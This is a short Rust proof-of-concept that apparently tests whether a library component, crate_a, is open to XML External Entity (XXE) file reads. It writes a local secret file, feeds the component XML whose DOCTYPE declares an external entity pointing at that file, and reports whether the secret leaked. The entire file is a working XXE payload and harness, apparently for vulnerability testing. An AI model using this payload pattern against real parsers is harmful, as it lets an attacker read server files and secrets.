use std::ffi::CString;
use std::fs;
use std::path::PathBuf;

fn get_untrusted_input() -> String {
    // Simulated attacker-controlled input (used in XML)
    "attacker".to_string()
}

fn main() {
    // Prepare a local file to demonstrate XXE file read
    let mut secret_path = PathBuf::from("output");
    let _ = fs::create_dir_all(&secret_path);
    secret_path.push("secret.txt");
    fs::write(&secret_path, "SECRET_FROM_FILE").expect("write secret");

    let file_url = format!("file://{}", secret_path.canonicalize().unwrap().display());
    let user = get_untrusted_input();

    // Craft XML with external entity
    let xml = format!(
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{}\">]>\n<root><foo>&xxe;</foo><user>{}</user></root>",
        file_url,
        user
    );

    let xml_c = CString::new(xml).unwrap();
    let base_c = CString::new("file://").unwrap();
    let mut out_buf = vec![0i8; 256];

    let rc = crate_a::entry(xml_c.as_ptr(), base_c.as_ptr(), out_buf.as_mut_ptr(), out_buf.len() as i32);
    if rc != 0 {
        eprintln!("component_a_entry failed");
        return;
    }

    let nul_pos = out_buf.iter().position(|&c| c == 0).unwrap_or(out_buf.len());
    let leaked_bytes = &out_buf[..nul_pos];
    let leaked_str = String::from_utf8_lossy(unsafe {
        std::slice::from_raw_parts(leaked_bytes.as_ptr() as *const u8, leaked_bytes.len())
    }).to_string();

    println!("[+] XXE leaked content: {}", leaked_str);
    if leaked_str.contains("SECRET_FROM_FILE") {
        println!("[+] Vulnerability triggered (XXE file read)");
    } else {
        println!("[-] Vulnerability not triggered");
    }
}
